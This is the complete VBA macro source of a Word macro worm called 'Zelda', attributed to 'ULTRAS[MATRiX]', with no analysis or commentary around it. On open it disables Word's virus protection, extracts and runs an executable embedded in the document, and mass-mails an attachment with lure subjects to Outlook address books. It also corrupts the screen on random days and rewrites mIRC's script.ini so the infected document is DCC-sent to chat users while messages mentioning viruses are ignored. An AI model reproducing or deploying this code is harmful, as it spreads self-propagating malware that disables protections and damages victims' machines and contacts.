Attribute VB_Name = "Zelda"
Declare Function GetLogicalDriveStrings Lib "kernel32" Alias "GetLogicalDriveStringsA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Declare Function GetDriveType Lib "kernel32.dll" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long
Private Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" (ByVal strSection As String, ByVal strKeyNam As String, ByVal strValue As String, ByVal strFileName As String) As Long
Public Declare Function GetWindowsDirectory Lib "kernel32" Alias "GetWindowsDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Public Declare Function GetDC Lib "user32" (ByVal hwnd As Long) As Long
Public Declare Function BitBlt Lib "gdi32" (ByVal hDestDC As Long, ByVal x As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal hSrcDC As Long, ByVal XSrc As Long, ByVal YSrc As Long, ByVal dwRop As Long) As Long
Private Declare Function OpenFile Lib "kernel32" Alias "_lopen" (ByVal s As String, ByVal mode As Long) As Long
Private Declare Function CreateFile Lib "kernel32" Alias "_lcreat" (ByVal s As String, ByVal attr As Long) As Long
Private Declare Function GlobalAlloc Lib "kernel32" (ByVal fl As Long, ByVal n As Long) As Long
Private Declare Sub CopyFileA Lib "kernel32" (ByVal src As String, ByVal dst As String, ByVal mode As Long)
Private Declare Sub SeekFile Lib "kernel32" Alias "_llseek" (ByVal h As Long, ByVal ofs As Long, ByVal fw As Long)
Private Declare Sub ReadFile Lib "kernel32" Alias "_lread" (ByVal h As Long, ByVal ptr As Long, ByVal n As Long)
Private Declare Sub WriteFile Lib "kernel32" Alias "_lwrite" (ByVal h As Long, ByVal ptr As Long, ByVal n As Long)
Private Declare Sub CloseFile Lib "kernel32" Alias "_lclose" (ByVal h As Long)
Declare Sub Sleep Lib "kernel32.dll" (ByVal dwMilliseconds As Long)
Public Const DRIVE_REMOVABLE = 2
Public Const DRIVE_FIXED = 3
Public Const DRIVE_REMOTE = 4
Public Const DRIVE_CDROM = 5
Public Const DRIVE_RAMDISK = 6

Sub AutoOpen()
On Error Resume Next
Dim doc As String, exe As String
Dim fileop As Long, galloc As Long
Dim OutlookApp, MAPIuz, Guan0utlook
Dim WinDir As String, zip As String
WinDir = WindowsDirectory
If Right(WinDir, 1) <> "\" Then WinDir = WinDir + "\"
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.CommandBars("Tools").Controls(12).Enabled = False
CommandBars("tools").Controls("Customize...").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
doc = WinDir & "zelda.doc"
exe = WinDir & "zelda.exe"
zip = WinDir & "zelda.zip"
CopyFileA ActiveDocument.FullName, doc, 0
galloc = GlobalAlloc(0, 4096)
fileop = OpenFile(doc, 0)
SeekFile fileop, 42496, 0
ReadFile fileop, galloc, 4096
CloseFile fileop
fileop = CreateFile(exe, 0)
WriteFile fileop, galloc, 4096
CloseFile fileop
Shell exe, 4
Sleep 5000
Set OutlookApp = CreateObject("Outlook.Application")
Set MAPIuz = OutlookApp.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Zelda\", "ZeLDA") <> "by ULTRAS[MATRiX]" Then
If OutlookApp = "Outlook" Then
MAPIuz.Logon "profile", "password"
For Address = 1 To MAPIuz.AddressLists.Count
Set AddyBook = MAPIuz.AddressLists(Address)
countz = 1
Set Guan0utlook = OutlookApp.CreateItem(0)
For mmez = 1 To AddyBook.AddressEntries.Count
AddBZ = AddyBook.AddressEntries(countz)
Guan0utlook.Recipients.Add AddBZ
countz = countz + 1
If countz > 30 Then oo = AddyBook.AddressEntries.Count
Next mmez
Randomize
numberz = Int(Rnd * 5) + 1
If numberz = 1 Then mez$ = "Open your eyes!"
If numberz = 2 Then mez$ = "" & Application.UserName & " :)"
If numberz = 3 Then mez$ = "Please read it.."
If numberz = 4 Then mez$ = "New story"
If numberz = 5 Then mez$ = "Important Info"
Guan0utlook.Subject = mez$
Guan0utlook.Body = "Password: Zelda"
Guan0utlook.Attachments.Add zip
Guan0utlook.Send
AddBZ = ""
Next Address
MAPIuz.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Zelda\", "ZeLDA") = "by ULTRAS[MATRiX]"
End If
Randomize
timez2 = Int(Rnd * 30) + 1
If Day(Now) = timez2 Then
MsgBox "Open your eyes", vbCritical, "Zelda"
For graf = 1 To 10000
Randomize
c = GetDC(0)
x = Int(Rnd * 600) + 1
Y = Int(Rnd * 800) + 1
X1 = x + 1
Y1 = Y + 1
c = BitBlt(c, Y1, X1, 3, 3, c, Y, x, 0)
Next graf
End If
ActiveDocument.Save
End Sub

Sub AutoClose()
On Error Resume Next
Dim Drive$, DriveType$, yz&
Dim Success&, x&, Y&, z&
Dim DriveLetters As String * 256
On Error Resume Next
Dim Msg As String
DriveLetters = 255
Success = GetLogicalDriveStrings(255, DriveLetters)
Do
x = Y + 1
z = z + 1
Y = InStr(x, DriveLetters, "\")
Drive = Mid$(DriveLetters, Y - 2, 3)
yz = GetDriveType(Drive)
If yz = DRIVE_FIXED Then
MiRC_iNF (Drive)
End If
Loop Until Y = 0
Endz:
End Sub

Sub FileSave()
On Error Resume Next
' Open your eyes
ActiveDocument.Save
Randomize
timez = Int(Rnd * 30) + 1
If Day(Now) = timez Then
dc = GetDC(0)
Blt = BitBlt(dc, 0, 0, 1024, 768, dc, 0, 0, &H550009)
End If
End Sub

Private Function MiRC_iNF(Drive)
On Error Resume Next
Dim WinDir As String
WinDir = WindowsDirectory
If Right(WinDir, 1) <> "\" Then WinDir = WinDir + "\"
full = WinDir & "zelda.doc"
SCP$ = Drive + "Program Files\Mirc32\mirc32.exe "
If Dir(SCP$) <> "" Then mircdir = 1: GoTo found
SCP$ = Drive + "Program Files\Mirc\mirc32.exe"
If Dir(SCP$) <> "" Then mircdir = 2: GoTo found
SCP$ = Drive + "Mirc\mirc32.exe"
If Dir(SCP$) <> "" Then mircdir = 3: GoTo found
SCP$ = Drive + "Mirc32\mirc32.exe"
If Dir(SCP$) <> "" Then mircdir = 4: GoTo found
GoTo not_found
found:
If mircdir = 1 Then Dirz$ = Drive + "Program Files\Mirc32\"
If mircdir = 2 Then Dirz$ = Drive + "Program Files\Mirc\"
If mircdir = 3 Then Dirz$ = Drive + "Mirc\"
If mircdir = 4 Then Dirz$ = Drive + "Mirc32\"
Open Dirz$ + "script.ini" For Output As #1
Print #1, "[script]"
Print #1, "n0; Zelda script"
Print #1, "n1; by ULTRAS[MATRiX]"
Print #1, "n2=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }"
Print #1, "n3=  /dcc send $nick " & full
Print #1, "n4=}"
Print #1, "n5=ON 1:PART:#:{ /if ( $nick == $me ) { halt }"
Print #1, "n6= /dcc send $nick " & full
Print #1, "n7=}"
Print #1, "n8=on 1:QUIT:#:/msg $chan What`s my age again?"
Print #1, "n9=on 1:TEXT:*virus*:#:/.ignore $nick"
Print #1, "n10=on 1:TEXT:*virus*:?:/.ignore $nick"
Print #1, "n11=on 1:TEXT:*worm*:#:/.ignore $nick"
Print #1, "n12=on 1:TEXT:*worm*:?:/.ignore $nick"
Print #1, "n13=on 1:TEXT:*zelda*:#:/.ignore $nick"
Print #1, "n14=on 1:TEXT:*zelda*:?:/.ignore $nick"
Print #1, "n15=on 1:TEXT:*doc*:#:/.ignore $nick"
Print #1, "n16=on 1:TEXT:*doc*:?:/.ignore $nick"
Close #1
strFile = Dirz$ + "mirc.ini"
strValue = Dirz$ + "script.ini"
strKeyName = "n2"
strSection = "rfiles"
intStatus = WritePrivateProfileString(strSection, strKeyName, strValue, strFile)
ActiveDocument.Save
not_found:
End Function

Function WindowsDirectory() As String
On Local Error Resume Next
Dim Winpath As String
Dim temp
Winpath = String(145, Chr(0))
temp = GetWindowsDirectory(Winpath, 145)
WindowsDirectory = Left(Winpath, InStr(Winpath, Chr(0)) - 1)
End Function
